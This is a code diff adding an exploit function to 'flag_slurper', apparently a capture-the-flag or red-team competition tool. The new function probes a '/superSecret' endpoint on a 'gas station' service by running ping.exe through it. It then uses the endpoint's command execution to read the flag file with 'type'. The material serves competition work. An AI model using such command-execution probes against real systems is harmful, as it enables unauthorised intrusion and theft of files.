@@ -2,6 +2,7 @@ import logging
 import os
 from typing import Tuple
 
+import requests
 import paramiko
 
 from flag_slurper.autolib.exploit import get_file_contents, get_system_info
@@ -66,6 +67,27 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple
         return 'Authentication failed', False, False
 
 
+def pwn_gas_backend(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple[str, bool, bool]:
+    if service.service_name != "Backend RDP":
+        return "Not a gas station", False, True
+
+    resp = requests.get('{}/superSecret?s=ping.exe'.format(url))
+    if resp.status_code != 200 or 'Usage: ping' not in resp.content.decode('utf-8'):
+        return "No secrets", False, False
+
+    if flag_conf:
+        flag_obj, _ = Flag.get_or_create(team=service.team, name=flag_conf['name'])
+        base_dir = flag_conf['location']
+        location = flag_conf['name']
+        full_location = os.path.join(base_dir, location)
+        resp = requests.get('{}/superSecret?s=type&a={}'.format(url, full_location))
+        flag = resp.content.decode('utf-8')
+        note, created = CaptureNote.get_or_create(flag=flag_obj, data=flag, location=full_location, notes="Super Secret Endpoint")
+        return "Got Secrets", True, False
+    return "Secrets exist", True, False
+
+
 PWN_FUNCS = {
     'ssh': pwn_ssh,
+    'rdp': pwn_gas_backend,
 }
